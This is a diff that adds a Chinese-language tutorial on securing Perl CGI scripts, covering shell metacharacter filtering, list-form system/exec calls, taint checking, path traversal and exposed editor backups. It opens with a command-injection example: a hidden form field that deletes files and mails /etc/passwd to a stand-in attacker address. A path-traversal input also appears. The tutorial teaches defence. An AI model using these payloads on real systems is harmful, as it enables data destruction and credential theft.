@@ -1,0 +1,148 @@
+
+```
+<HTML><body>
+<h1>Hacking beef.com!</h1>
+<form action="http://www.beef.com/CGI-bin/doit.pl" method = "get">
+<input type="hidden" name="myaddress" value="; rm * ;mail -s Haha hacker@bacon.com </etc/passwd;">
+<input type = "text" name=input>
+<input type = "submit" value="Hack Away!">
+</form>
+```
+
+隐藏值字段中的分号充当分隔符，将 UNIX 命令分隔开，使其能够在同一行 shell 中执行多个命令。Perl 中的系统调用会生成一个 UNIX shell，并在此情况下执行值字段中的命令，删除目录中的当前文件并将密码文件发送给黑客。
+
+这里的第一个教训是，传递给 CGI 脚本的用户输入永远不能被信任。第二个教训是避免在 Perl 或任何语言中滥用系统调用。
+
+## 其他系统调用漏洞
+
+如果未正确编码，任何 CGI 系统调用本质上都是危险的。考虑以下 Perl 代码行。记住，Perl 反引号遵循 shell 惯例 —— 即使用引用的字符串作为命令行生成一个 UNIX 子 shell，并且该命令的输出成为 Perl 命令的参数。
+
+```
+print `/usr/local/bin/finger $userinput`;
+```
+
+这可以通过使用与之前相同的恶意用户输入来利用。一般来说，以下元字符都不应出现在用户输入中。
+
+```
+; > < & * ` | $ #
+```
+
+以下是一个用于检查这些字符的 Perl 代码示例。
+
+```perl
+if ($userinput =~ /[;\|<>*&\|]/) { #match any characters
+    print "<h1>CGI ERROR: What are you doing!<\/h1>";
+    #print an error
+} else {
+    print `/usr/local/bin/finger $userinput`;
+    #proceed normally
+}
+```
+
+对于电子邮件地址表单输入，你可以用 Perl 指定一种安全的域格式电子邮件格式，如下例所示。（注意该示例未考虑 UUCP 地址。）
+
+```perl
+unless ($userinput =~ /^[\w@\.-]+$/) {
+    #if does not match email format
+    print "<h1>CGI ERROR: Enter a valid EMAIL address<\/h1>";
+    #print an error
+} else {
+    print `/usr/local/bin/finger $userinput`; #proceed normally
+}
+```
+
+在 Perl 中，你也可以使用前面示例中的反引号或 `eval` 语句来执行系统调用。请考虑这些系统调用的以下替代方案。对于电子邮件用途，请使用以下方式。
+
+```perl
+open (MAIL, "| /usr/lib/sendmail -t -n");
+print MAIL <<END_OF_MESSAGE;
+From: $from_input
+To: $to_input
+Subject: $subject_input
+
+$message_input
+END_OF_MESSAGE
+```
+
+此示例打开一个通向 `sendmail` 的管道进程，从而避免用户输入与系统调用带来的危险。
+
+在 `system` 和 `exec` 命令下，有一个选项可让你直接调用外部程序，而不是调用 shell。按以下方式列出参数可以防止生成 UNIX shell，从而防止元字符产生不良副作用，并消除任何 shell 漏洞。
+
+```perl
+system "/usr/bin/finger", $userinput;
+exec "/bin/ping", $ping_argument, $ping_host;
+```
+
+下面是另一个防止 shell 漏洞的管道进程示例的通用形式。
+
+```perl
+open(Filehandle_name, '|-' ) || exec "program", $arg1, $arg2;
+```
+
+通过使用神秘的代码序列 `|-`，你可以派生一个 Perl 副本并打开通向该副本的管道，该副本将执行 `exec` 指定的程序。注意程序列表采用前面示例中提到的相同格式。下面的示例说明了这种程序列表格式。
+
+```perl
+open(FIND,"|-") || exec "/usr/bin/find",".","-name",$name,"-print";
+while (<FIND>) {
+    print "found: $_";
+}
+close FIND;
+```
+
+该脚本在系统中搜索输入变量 `$name` 并打印所有出现的位置。它成功地避免了生成 UNIX shell，从而提高了性能并加强了安全性。有关系统调用的更详细 Perl 替代方案，请阅读 WWW 安全 FAQ 中关于安全脚本编写的部分。
+
+## 打开文件
+
+假设你正在编写一个程序，该程序根据输入消息的用户名来存储消息。你在脚本中添加了以下代码行。
+
+```perl
+open(FILE,">/usr/local/message/data/$username");
+```
+
+如果用户输入 `../../../../etc/passwd` 作为其用户名会怎样？你可能会遇到严重的问题。打开任何类型的文件句柄时，务必检查 `..`。
+
+## 污点检查：一个有用的工具
+
+Perl 有一个非常实用的选项来处理不安全的用户变量。请考虑 CGI 中的大多数漏洞都源于传递给脚本的用户输入。再想象一下，传递给程序的每个外部变量都被污染了，并且这种污染会像传染病一样扩散到系统的其他部分。Perl 的污点检查可防止任何被污染的变量用于 `system`、`eval`、`exec` 和反引号命令，或任何其他影响外部系统环境的操作。如果检测到此类尝试，Perl 将退出脚本并显示错误消息。
+
+要在 Perl v4 中启用污点检查，脚本的第一行应为
+
+```perl
+#!/usr/local/bin/taintperl
+```
+
+这将加载一个特殊版本的解释器。在 Perl v5 中，你可以使用 `-T` 选项启用污点检查。例如，
+
+```perl
+#!/usr/local/bin/perl -T
+```
+
+（如果你不确定自己使用的是哪个 Perl 版本，请键入 `perl -v`。）
+
+一旦用户将其电子邮件地址传入你的脚本，你就应该对该变量进行去污。只有在对其执行模式匹配时，变量才能被去污。只有从变量中提取出预期字符串后，你才能正常使用它。例如，要对电子邮件地址进行去污（示例取自 WWW 安全 FAQ），请使用以下代码。
+
+```perl
+$mail_address =~ /([\w.]+@[\w.-]+)/;
+$untainted_address = $1;
+```
+
+在执行污点检查时，你还需要包含一项内容。由于 Perl 解释器不会默认环境路径，因此即使你的程序不与 shell 交互，你也必须定义它。请确保在代码中包含以下行，否则你将收到关于不安全路径的错误提示。
+
+```perl
+$ENV{'PATH'} = '/usr/bin:/usr/local/bin:/bin';
+```
+
+黑客最喜欢的技巧是篡改你的环境变量，使其指向另一个目录中的木马。因此，在使用系统调用时，你应该始终指定命令的完整路径。比较以下两个示例以澄清这一点。
+
+```perl
+system("finger $untainted_user"); #This is bad. Avoid.
+system("/usr/local/bin/finger $untainted_user"); #This is better.
+```
+
+## 可怕的自动备份
+
+在实际的 `cgi-bin` 目录中编辑 CGI 脚本时要小心。某些编辑器，例如 EMACS，如果你编辑原始文件，会创建一个扩展名为 `~` 的备份文件。如果潜在的入侵者 somehow 猜到文件 `password.pl` 的备份为 `password.pl~`，他将能够查看备份程序的实际代码，因为服务器不识别扩展名 `.pl~`。通过将备份文件作为纯文本查看，入侵者可能会通过扫描代码中的漏洞来利用原始的 CGI 程序。留意 `cgi-bin` 目录中任何可疑类型的扩展名。
+
+## 其他一些零碎事项
+
+关于要在脚本和 `cgi-bin` 目录中包含的内容，你应尽量不要透露太多关于服务器的信息。例如，`finger` 命令是一个方便的功能，但它可能会向可能的窥探者透露重要信息，例如主目录或邮件转发路径。关于 `cgi-bin` 目录中包含的二进制文件和脚本，你应定期仔细检查这些文件。
